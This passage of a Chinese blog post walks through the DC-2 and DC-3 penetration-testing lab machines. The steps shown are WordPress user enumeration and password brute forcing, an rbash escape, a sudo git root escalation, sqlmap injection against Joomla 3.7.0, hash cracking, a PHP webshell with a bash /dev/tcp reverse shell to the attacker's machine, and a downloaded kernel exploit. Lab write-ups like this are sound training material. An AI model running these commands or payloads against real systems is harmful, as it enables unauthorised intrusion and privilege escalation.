+<p>针对 <strong>WordPress</strong> 有一个专门的扫描工具：WPScan<br>
+<code>wpscan --url http://dc-2/ -e u</code>      //枚举用户名字</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.5/020.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>拿到了三个账户名：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">admin
+</span></span><span class="line"><span class="cl">jerry
+</span></span><span class="line"><span class="cl">tom
+</span></span></code></pre></td></tr></table>
+</div>
+</div><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.5/021.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>结合前面提示，使用工具 cewl：</p>
+<p>只需要给 <strong>CeWL</strong> 一个目标 URL，它就会像爬虫一样把网页上的单词全部“抓”下来，生成字典</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">cewl http://dc-2 -w passwd.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>此外， 新建一个用户名的字典，也就是</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">admin
+</span></span><span class="line"><span class="cl">jerry
+</span></span><span class="line"><span class="cl">tom
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>准备好用户名和密码字典后，使用wpscan进行爆破：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">wpscan --url http://dc-2 -U users.txt -P passwd.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>查看结果，找到了tom和Jerry的密码</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.5/022.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+><br>
+即：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">| Username: jerry, Password: adipiscing
+</span></span><span class="line"><span class="cl">| Username: tom, Password: parturient
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>选取其中一条登录后台即可。</p>
+<p>在<strong>Pages</strong>中找到了flag2</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.5/023.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>提示：</p>
+<p><strong>“如果你无法通过漏洞利用（Exploit）直接拿下 WordPress 或者走捷径，那么还有另一种方法。”</strong></p>
+<p><strong>“希望你已经找到了另一个入口点。”</strong></p>
+<p>暗示我们：WordPress 站点应该没什么东西了，要找其他入口</p>
+<hr>
+<h3 id="flag3-1">flag3：
+</h3><p>尝试 ssh 连接：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">ssh jerry@192.168.172.131 -p 7744
+</span></span><span class="line"><span class="cl">ssh tom@192.168.172.131 -p 7744
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>使用tom时登录成功</p>
+<p><code>ls</code>发现flag3.txt就在这里但是<code>cat</code>读取不了</p>
+<p>但是很多命令（如<code>whoami</code>、<code>cat</code>）都不能执行，因为是rbash（受限制的终端）</p>
+<p>查看可以使用的命令（rbash特性）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">ls /home/tom/usr/bin
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现可以使用less和vi命令，这两个命令都可以查看文件内容</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">less flag3.txt
+</span></span><span class="line"><span class="cl">或
+</span></span><span class="line"><span class="cl">vi flag3.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>拿到flag3.txt<!-- 这是一张图片，ocr 内容为： -->
+<img src="/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.5/024.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>flag3 提示：</p>
+<p><strong>可怜的老汤姆（Tom）总是追着杰瑞（Jerry）跑。也许他应该因为杰瑞给他造成的压力而提起诉讼（su）。</strong></p>
+<h3 id="flag4-1">flag4
+</h3><p>由flag3提示暗示我们要提权，此处补充基于vi的rbash逃逸:</p>
+<p><font style="color:rgb(0, 0, 0);">先后输入回车：</font></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">set shell=/bin/bash
+</span></span><span class="line"><span class="cl">shell
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>此时发现可以切换目录了。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">cd ..
+</span></span><span class="line"><span class="cl">ls 发现tom和jerry两个目录
+</span></span><span class="line"><span class="cl">cd jerry 
+</span></span><span class="line"><span class="cl">ls 发现flag4.txt就在这里
+</span></span><span class="line"><span class="cl">less flag4.txt 读取
+</span></span></code></pre></td></tr></table>
+</div>
+</div><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.5/025.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>提示：</p>
+<p><strong>“很高兴看到你已经走了这么远——但你还没到家呢。”</strong></p>
+<p><strong>“你仍然需要拿到最后的 Flag（那是唯一真正算数的 Flag！！！）。”</strong></p>
+<p><strong>“这里没有提示——现在你只能靠自己了。:-)”</strong></p>
+<p><strong>“继续——快从这儿滚出去（git outta here）！！！！</strong></p>
+<p>大概意思就是：你已经完成了所有的中间铺垫，现在只剩最后一关——拿到 Root 权限</p>
+<h3 id="final-flag-1">final-flag
+</h3><p><strong>重点：完全逃逸rbash</strong></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.5/026.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>执行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">BASH_CMDS[a]=/bin/sh;a
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>虽然还是无法使用cat这些命令，但是可以使用带斜杠的命令了，升级终端，执行：<code>/bin/bash</code></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.5/027.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>接下来修复环境变量：</p>
+<p>把系统的标准工具库（<code>/bin</code> 和 <code>/usr/bin</code>）重新加入到我的搜索路径中</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">export PATH=$PATH:/bin/
+</span></span><span class="line"><span class="cl">export PATH=$PATH:/usr/bin
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>至此，已经完全逃出 rbash 限制，系统重新找回了执行标准命令的能力。</p>
+<p>就可以使用cat命令了，其他命令也恢复正常。</p>
+<p>根据上面的提示，我们要使用git进行提权，</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">sudo git -p help config
+</span></span><span class="line"><span class="cl">!/bin/sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>直接执行发现tom的权限不够，所以我们调转到jerry用户上：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">su jerry
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>重新执行一遍，成功提权到root。</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.5/028.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>最后进入root目录，<code>ls</code>发现存在最终flag，cat读取拿下。</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.5/029.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<h2 id="dc-3">DC-3
+</h2><p>nmap强扫描发现开放80端口,cms框架为Joomla</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.5/030.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>接下来扫描目录：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">dirb http://192.168.80.159/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现了<code>http://192.168.80.159/administrator/</code>，说明存在管理员登录接口</p>
+<p>安装针对性工具利用漏洞：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">apt install joomscan
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>使用joomscan扫描：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">joomscan -u http://192.168.80.159/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到版本号为<code>3.7.0</code></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.5/031.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>搜索该框架版本相关的典型漏洞：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">searchsploit Joomla 3.7.0
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Searchsploit</strong> 是一个<strong>离线的漏洞利用代码（Exploit）搜索引擎</strong></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.5/032.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>可以看到该版本有一个 SQL 注入，受影响的组件是 <code>com_fields</code>，并且后面的路径(Path)显示为<code>php/webapps/42033.txt</code>，里面写有漏洞触发的具体参数(Payload)，查看该文件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">searchsploit -x php/webapps/42033.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>查看到返回的文档中有使用sqlmap的注入方法（可以复制到文本编辑器中方便修改）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">sqlmap -u &#34;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
+</span></span></code></pre></td></tr></table>
+</div>
+</div><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.5/033.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>常规sql爆库、表、字段、内容：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">sqlmap -u &#34;http://192.168.80.159/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] --batch
+</span></span><span class="line"><span class="cl">// 看到数据库joomladb
+</span></span><span class="line"><span class="cl">sqlmap -u &#34;http://192.168.80.159/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34; --risk=3 --level=5 --random-agent -D joomladb --tables -p list[fullordering] --batch
+</span></span><span class="line"><span class="cl">// 看到表#__users
+</span></span><span class="line"><span class="cl">sqlmap -u &#34;http://192.168.80.159/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34; --risk=3 --level=5 --random-agent -D joomladb -T &#34;#__users&#34; --columns -p list[fullordering]
+</span></span><span class="line"><span class="cl">// 注意表名加双引号防止注释，不加--batch，前两个选yes，后面直接全部回车；看到username和password
+</span></span><span class="line"><span class="cl">sqlmap -u &#34;http://192.168.80.159/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34; --risk=3 --level=5 --random-agent -D joomladb -T &#34;#__users&#34; -C username,password --dump -p list[fullordering] --batch
+</span></span><span class="line"><span class="cl">// 看到 admin:$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>成功拿到admin的hash值</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.5/034.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>接下来使用john工具进行破解：</p>
+<p>创建<code>a.txt</code>内容为：<code>admin:$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</code></p>
+<p>在当前目录运行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">john a.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>成功拿到密码<code>snoopy</code></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.5/035.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>浏览器登录后台。</p>
+<p>发现在Extensions-&gt;Templates-&gt;Templates 里面可以插入 PHP 代码（其实就是可以编辑页面的源代码）</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.5/036.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>第一行写个一句话木马，蚁剑连接。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">http://192.168.80.159/templates/beez3/index.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><hr>
+<p><strong>（可选）</strong> 或者为了方便继续用Kali操作，我们可以反弹shell到Kali：</p>
+<ol>
+<li>提前在Kali上nc监听4444端口</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">nc -lvvp 4444
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="2">
+<li>将插入的一句话木马换成：</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">system(&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/Kali的IP/4444 0&gt;&amp;1&#39;&#34;);
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="3">
+<li>浏览器访问<code>http://192.168.80.159/templates/beez3/index.php</code>，触发反弹</li>
+</ol>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.5/037.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<hr>
+<p><code>whoami</code>发现目前还不是root权限。</p>
+<p>收集下主机的版本信息：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl"># 查看内核版本
+</span></span><span class="line"><span class="cl">uname -a
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># 查看发行版详细信息
+</span></span><span class="line"><span class="cl">lsb_release -a
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># 查看系统版本文件
+</span></span><span class="line"><span class="cl">cat /etc/issue
+</span></span></code></pre></td></tr></table>
+</div>
+</div><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.5/038.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>至此，信息搜集完毕，<code>exit</code>退出webshell</p>
+<p>查找相关漏洞：<code>searchsploit Ubuntu 16.04 4.4.0-21</code></p>
+<p>内容大多是针对64位系统的，所以放宽条件查找：<code>searchsploit Ubuntu 16.04</code></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.5/039.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>初步判断<code>39772</code>对应的 <code>double-fdput()</code> 漏洞利用包是最适合这个 <code>4.4.0-21</code> 内核的，该脚本极为稳定且不挑架构，适配 32 位架构。</p>
+<p>查看该文件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">cat /usr/share/exploitdb/exploits/linux/local/39772.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>给了 exp 的具体GitHub项目地址：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.5/040.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>回到webshell，方法同上。</p>
+<p>为了防止一些目录没有写入权限，我们先切换目录：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">cd /var/www/html
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>用<code>wget</code>将工具下载到目标：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>解压：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">unzip 39772.zip
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">cd 39772
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">tar -xvf exploit.tar
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">cd ebpf_mapfd_doubleput_exploit
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>编译：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">./compile.sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>运行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">./doubleput
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>稍等一会，拿到了root权限。</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.5/041.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>切换到<code>root</code>目录，可以正常读取flag文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">cd ../../../../../
+</span></span><span class="line"><span class="cl">ls
+</span></span><span class="line"><span class="cl">cat the-flag.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.5/042.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+        <link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"integrity="sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI&#43;WdtXRGWt2kTvGFasHpSy3SV"crossorigin="anonymous"
+            ><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"integrity="sha384-XjKyOOlGwcjNTAIQHIpgOno0Hl1YQqzUOEleOLALmuqehneUG&#43;vnGctmUb0ZY0l8"crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"integrity="sha384-&#43;VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4&#43;/RRE05"crossorigin="anonymous"
+                defer
+                >
+            </script><script>
+    window.addEventListener("DOMContentLoaded", () => {
+	const mainArticleElement = document.querySelector(".main-article");
+        renderMathInElement(mainArticleElement, {
+            delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+                { left: "\\[", right: "\\]", display: true }
+            ],
+            ignoredClasses: ["gist"]
+        });})
+</script>
+<div class="math-katex"></div>
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/2.3-sp-pte%E6%A8%A1%E6%8B%9F%E5%85%A8wp/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2.3-SP PTE模拟全WP</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/2.3-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2.3 代码审计</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/2.2-%E6%95%B0%E5%AD%97%E5%8F%96%E8%AF%81/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2.2 数字取证</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/2.1-%E7%BB%BC%E5%90%88%E7%BB%83%E4%B9%A0/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2.1 综合练习</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/1.31-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">
+        
+        
+
